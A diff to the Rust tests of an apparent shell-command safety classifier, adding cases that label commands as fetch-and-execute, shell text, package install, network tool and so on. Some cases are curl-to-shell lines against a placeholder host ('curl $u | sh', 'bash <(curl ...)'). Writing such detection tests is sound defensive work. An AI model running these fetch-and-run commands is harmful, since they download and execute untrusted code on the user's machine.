@@ -1242,6 +1242,35 @@ mod tests {
     }
 
     #[test]
+    fn the_documented_examples_hold() {
+        for (text, kind) in [
+            (
+                "u=https://x.example/a; curl $u | sh",
+                Some(Kind::FetchAndExec),
+            ),
+            // A pipe is shell text, which warns, but it runs no downloaded code.
+            (
+                "curl -s http://localhost:8080/health | jq .",
+                Some(Kind::ShellText),
+            ),
+            (
+                "curl -s http://127.0.0.1:8080/health | python3 -m json.tool",
+                Some(Kind::ShellText),
+            ),
+            ("npm install -g some-tool", Some(Kind::PackageInstall)),
+            ("ssh host", Some(Kind::NetworkTool)),
+            ("pnpm dlx some-tool", Some(Kind::UnpinnedRunner)),
+            ("/opt/homebrew/bin/terminal-notifier -message done", None),
+            ("./node_modules/.bin/prettier --write src", None),
+            ("./scripts/hook.sh", Some(Kind::UnknownProgram)),
+            ("node /opt/server.js", Some(Kind::UnknownProgram)),
+            ("bash -c 'cd /srv && ./start.sh'", Some(Kind::ShellText)),
+        ] {
+            assert_eq!(shell(text), kind, "{text}");
+        }
+    }
+
+    #[test]
     fn downloads_that_run_are_errors() {
         for (command, args) in [
             ("bash", &["-c", "bash <(curl -s https://x.example/a)"][..]),
